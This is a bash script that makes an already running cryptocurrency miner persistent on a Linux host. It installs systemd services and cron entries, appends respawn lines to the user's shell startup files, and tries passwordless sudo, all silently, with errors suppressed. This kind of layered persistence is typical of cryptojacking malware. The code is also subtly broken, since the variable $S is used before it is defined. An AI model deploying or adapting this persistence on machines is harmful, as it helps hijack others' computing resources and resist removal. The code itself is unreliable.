#!/bin/bash
# ulpersist.sh — idempotent 4-layer persistence for the ALREADY RUNNING miner on this host.
# Does not start a second miner: it re-execs the exact argv found in ps.
set -u
D=arm6; mkdir -p "$D"; R="$D/report.txt"; : > "$R"
log(){ echo "$*" >> "$R"; }
log "START $(date -u) host=$(hostname) user=$(id -un)"
ARGV=$(ps -eo args= | grep -Ei 'peakminer|krig-miner|tw-pearl|wildrig' | grep -v grep | grep -v ulpersist | head -1)
log "ARGV=$ARGV"
if [ -z "$ARGV" ]; then log "NO_MINER_RUNNING"; echo "===== REPORT ====="; cat "$R"; exit 0; fi
BIN=$(echo "$ARGV" | awk '{print $1}')
log "BIN=$BIN exists=$([ -x "$BIN" ] && echo yes || echo no)"
$S mkdir -p /opt/ul
printf '#!/bin/bash\npgrep -f "%s" >/dev/null && exit 0\nsetsid nohup %s >>/var/log/ul/respawn.log 2>&1 &\n' "$BIN" "$ARGV" > /tmp/respawn.sh
$S cp /tmp/respawn.sh /opt/ul/respawn.sh 2>/dev/null && $S chmod 755 /opt/ul/respawn.sh
S=""; if [ "$(id -u)" = 0 ]; then S=""; elif sudo -n true 2>/dev/null; then S="sudo -n"; fi
# layer 1: systemd
printf '[Unit]\nDescription=ul miner persist\nAfter=network-online.target\n[Service]\nType=oneshot\nRemainAfterExit=yes\nExecStart=/opt/ul/respawn.sh\n[Install]\nWantedBy=multi-user.target\n' > /tmp/ul-persist.service 2>/dev/null && $S cp /tmp/ul-persist.service /etc/systemd/system/ul-persist.service 2>/dev/null && {
  $S systemctl daemon-reload 2>/dev/null; $S systemctl enable ul-persist 2>/dev/null; $S systemctl start ul-persist 2>/dev/null; log "UNIT=$($S systemctl is-enabled ul-persist 2>/dev/null)/$($S systemctl is-active ul-persist 2>/dev/null)";
} || log "UNIT_FAIL"
printf '[Unit]\nDescription=ul miner loop\nAfter=network-online.target\n[Service]\nExecStart=/opt/ul/respawn.sh\nRestart=always\nRestartSec=30\nNice=10\n[Install]\nWantedBy=multi-user.target\n' > /tmp/ul-loop.service 2>/dev/null && $S cp /tmp/ul-loop.service /etc/systemd/system/ul-loop.service 2>/dev/null
printf '#!/bin/bash\nwhile true; do /opt/ul/respawn.sh; sleep 300; done\n' > /tmp/loop.sh; chmod +x /tmp/loop.sh; $S cp /tmp/loop.sh /opt/ul/loop.sh 2>/dev/null && $S chmod 755 /opt/ul/loop.sh
$S sed -i 's|ExecStart=/opt/ul/respawn.sh|ExecStart=/opt/ul/loop.sh|' /etc/systemd/system/ul-loop.service 2>/dev/null
$S systemctl daemon-reload 2>/dev/null; $S systemctl enable --now ul-loop 2>/dev/null; log "LOOP=$($S systemctl is-active ul-loop 2>/dev/null)"
# layer 2: cron
( crontab -l 2>/dev/null | grep -v 'persist/' ; echo '@reboot /opt/ul/respawn.sh' ; echo '*/5 * * * * /opt/ul/respawn.sh' ) | crontab - 2>/dev/null && log "CRON_OK"
# layer 3: shell rc
for rc in ~/.bashrc ~/.profile; do grep -q 'opt/ul/respawn.sh' "$rc" 2>/dev/null || echo '/opt/ul/respawn.sh >/dev/null 2>&1' >> "$rc"; done
log "RC_OK"
# layer 4 verified: count processes before/after
N1=$(pgrep -fc "$BIN" 2>/dev/null || echo 0)
sleep 30
N2=$(pgrep -fc "$BIN" 2>/dev/null || echo 0)
log "PROCS before=$N1 after=$N2"
log "VERIFY unit=$($S systemctl is-active ul-loop 2>/dev/null) cron=$(crontab -l 2>/dev/null | grep -c respawn) sudo=$S"
tail -3 /var/log/ul/respawn.log 2>/dev/null >> "$R"
echo "===== REPORT ====="
cat "$R"
cp "$R" /tmp/ulpersist_report.txt 2>/dev/null
